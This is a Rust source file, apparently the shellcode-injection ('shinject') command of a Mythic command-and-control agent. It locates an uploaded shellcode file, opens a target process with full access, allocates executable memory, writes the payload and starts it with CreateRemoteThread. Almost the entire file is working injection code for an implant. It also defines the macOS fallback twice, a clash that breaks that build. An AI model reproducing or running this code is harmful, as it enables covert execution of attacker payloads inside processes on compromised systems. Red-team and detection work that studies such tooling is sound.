use std::mem;
use std::ptr;
use std::fs;
use crate::{AgentTask, mythic_success, mythic_error};
use crate::agent::ShinjectArgs;

#[cfg(target_os = "windows")]
use winapi::shared::minwindef::{FALSE, DWORD, LPVOID};
#[cfg(target_os = "windows")]
use winapi::shared::basetsd::SIZE_T;
#[cfg(target_os = "windows")]
use winapi::um::processthreadsapi::*;
#[cfg(target_os = "windows")]
use winapi::um::memoryapi::*;
#[cfg(target_os = "windows")]
use winapi::um::handleapi::*;
#[cfg(target_os = "windows")]
use winapi::um::synchapi::*;
#[cfg(target_os = "windows")]
use winapi::um::errhandlingapi::GetLastError;
#[cfg(target_os = "windows")]
use winapi::um::winbase::WAIT_OBJECT_0;

#[cfg(target_os = "windows")]
const PAGE_EXECUTE_READWRITE: DWORD = 0x40;
#[cfg(target_os = "windows")]
const MEM_COMMIT: DWORD = 0x1000;
#[cfg(target_os = "windows")]
const MEM_RESERVE: DWORD = 0x2000;
#[cfg(target_os = "windows")]
const PROCESS_ALL_ACCESS: DWORD = 0x1F0FFF;
#[cfg(target_os = "windows")]
const INFINITE: DWORD = 0xFFFFFFFF;

// ========================================
// Main command execution for Mythic
// ========================================
#[cfg(target_os = "windows")]
pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    // Parse arguments from task parameters
    let args: ShinjectArgs = serde_json::from_str(&task.parameters)?;

    // The shellcode field contains the file ID from Mythic
    // When delete_after_fetch=True is set in shinject.py, Mythic should download the file
    // to the agent's current working directory or temp directory
    
    let mut shellcode_bytes = Vec::new();
    let mut found_file = false;
    
    // Debug: Print what we're looking for
    eprintln!("DEBUG: Looking for shellcode file with ID: {}", args.shellcode);
    eprintln!("DEBUG: Current working directory: {}", std::env::current_dir()?.to_string_lossy());
    eprintln!("DEBUG: Temp directory: {}", std::env::temp_dir().to_string_lossy());
    
    // Check common locations where Mythic downloads files
    let possible_paths = vec![
        // Current working directory (most common)
        std::env::current_dir()?.join(&args.shellcode),
        // Temp directory
        std::env::temp_dir().join(&args.shellcode),
        // Downloads directory
        std::env::home_dir().unwrap_or_default().join("Downloads").join(&args.shellcode),
        // Direct path (in case it's already a full path)
        std::path::Path::new(&args.shellcode).to_path_buf(),
        // Check if it's a relative path in current directory
        std::env::current_dir()?.join(".").join(&args.shellcode),
    ];
    
    // Debug: Print search locations
    for (i, path) in possible_paths.iter().enumerate() {
        eprintln!("DEBUG: Search location {}: {}", i + 1, path.to_string_lossy());
        eprintln!("DEBUG: File exists: {}", path.exists());
    }
    
    // Try to read the file from various possible locations
    for path in &possible_paths {
        if path.exists() {
            eprintln!("DEBUG: Found file at: {}", path.to_string_lossy());
            match fs::read(path) {
                Ok(bytes) => {
                    shellcode_bytes = bytes;
                    found_file = true;
                    eprintln!("DEBUG: Successfully read {} bytes from file", shellcode_bytes.len());
                    break;
                }
                Err(e) => {
                    eprintln!("DEBUG: Failed to read file {}: {}", path.to_string_lossy(), e);
                    continue;
                }
            }
        }
    }
    
    if !found_file {
        return Ok(mythic_error!(
            task.id,
            format!(
                "Shellcode file '{}' not found.\n\nDEBUG INFO:\n- File ID: {}\n- Searched locations:\n{}\n\nTROUBLESHOOTING:\n1. Make sure the file was uploaded to Mythic\n2. Check that delete_after_fetch=True is working\n3. Verify the agent can access the file locations\n4. Try uploading the file again",
                args.shellcode,
                args.shellcode,
                possible_paths.iter()
                    .enumerate()
                    .map(|(i, path)| format!("  {}. {} (exists: {})", i + 1, path.to_string_lossy(), path.exists()))
                    .collect::<Vec<_>>()
                    .join("\n")
            )
        ));
    }

    unsafe {
        match inject_shellcode_impl(args.process_id, &shellcode_bytes) {
            Ok(output) => Ok(mythic_success!(task.id, output)),
            Err(e) => Ok(mythic_error!(task.id, e)),
        }
    }
}

// ========================================
// Windows shellcode injection implementation
// ========================================
#[cfg(target_os = "windows")]
unsafe fn inject_shellcode_impl(process_id: u32, shellcode: &[u8]) -> Result<String, String> {
    let h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
    if h_process.is_null() {
        return Err(format!(
            "Failed to open process with PID: {}. Error: {}",
            process_id,
            GetLastError()
        ));
    }

    let buffer_size = shellcode.len();
    let remote_mem = VirtualAllocEx(
        h_process,
        ptr::null_mut(),
        buffer_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );

    if remote_mem.is_null() {
        CloseHandle(h_process);
        return Err("VirtualAllocEx failed".to_string());
    }

    let mut bytes_written: SIZE_T = 0;
    let write_result = WriteProcessMemory(
        h_process,
        remote_mem,
        shellcode.as_ptr() as LPVOID,
        buffer_size,
        &mut bytes_written,
    );

    if write_result == 0 || bytes_written != buffer_size {
        CloseHandle(h_process);
        return Err(format!(
            "WriteProcessMemory failed. Written: {}/{} bytes. Error: {}",
            bytes_written,
            buffer_size,
            GetLastError()
        ));
    }

    let mut thread_id: DWORD = 0;
    let h_thread = CreateRemoteThread(
        h_process,
        ptr::null_mut(),
        0,
        Some(mem::transmute(remote_mem)),
        ptr::null_mut(),
        0,
        &mut thread_id,
    );

    if h_thread.is_null() {
        CloseHandle(h_process);
        return Err("CreateRemoteThread failed".to_string());
    }

    let wait_result = WaitForSingleObject(h_thread, INFINITE);

    // Clean up
    CloseHandle(h_thread);
    CloseHandle(h_process);

    if wait_result == WAIT_OBJECT_0 {
        Ok(format!(
            "Shellcode successfully injected into PID {}. Thread ID: {}",
            process_id, thread_id
        ))
    } else {
        Err(format!("WaitForSingleObject failed with result: {}", wait_result))
    }
}

// ========================================
// macOS placeholder implementation
// ========================================
#[cfg(target_os = "macos")]
pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    Ok(mythic_error!(
        task.id,
        "shinject command is not implemented for macOS"
    ))
}

// ========================================
// Fallback for other platforms
// ========================================
#[cfg(not(target_os = "windows"))]
pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    Ok(mythic_error!(
        task.id,
        "shinject command is only supported on Windows"
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shinject_args_parsing() {
        let args = ShinjectArgs {
            shellcode: "test_file_id".to_string(),
            process_id: 1234,
        };
        assert_eq!(args.shellcode, "test_file_id");
        assert_eq!(args.process_id, 1234);
    }
}
